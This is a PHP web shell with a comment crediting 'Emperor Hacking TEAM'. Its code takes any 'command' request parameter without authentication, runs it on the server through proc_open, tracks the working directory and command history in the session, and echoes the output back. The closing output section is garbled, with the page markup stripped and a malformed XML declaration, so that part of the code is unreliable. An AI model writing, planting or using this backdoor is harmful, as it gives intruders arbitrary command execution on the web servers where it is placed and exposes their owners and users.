<?php

/*Emperor Hacking TEAM */
  session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
  }
  
  if (!empty($_REQUEST['command'])) {
    if (get_magic_quotes_gpc()) {
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
    }
    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
      unset($_SESSION['history'][$i]);
    
    array_unshift($_SESSION['history'], $_REQUEST['command']);
  
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
      $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {

      if ($regs[1][0] == '/') {

        $new_dir = $regs[1];
      } else {

        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
      }
      

      while (strpos($new_dir, '/./') !== false)
        $new_dir = str_replace('/./', '/', $new_dir);


      while (strpos($new_dir, '//') !== false)
        $new_dir = str_replace('//', '/', $new_dir);

      while (preg_match('|/\.\.(?!\.)|', $new_dir))
        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
      if ($new_dir == '') $new_dir = '/';
      

      if (@chdir($new_dir)) {
        $_SESSION['cwd'] = $new_dir;
      } else {
        $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
      }
      
    } else {

      chdir($_SESSION['cwd']);

      $length = strcspn($_REQUEST['command'], " \t");
      $token = substr($_REQUEST['command'], 0, $length);
      if (isset($aliases[$token]))
        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
    
      $p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);


      while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
      }

      while (!feof($io[2])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
      }
      
      fclose($io[1]);
      fclose($io[2]);
      proc_close($p);
    }
  }


  if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
  } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
  }


header('Content-Type: text/html; charset=UTF-8');

echo '<?xml version="Dive.0.1" encoding="UTF-8"?><?php echo $js_command_hist ?><?php echo $_SESSION['cwd'] ?><?php echo $_SERVER['PHP_SELF'] ?><?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?><?php echo $_REQUEST['rows'] ?>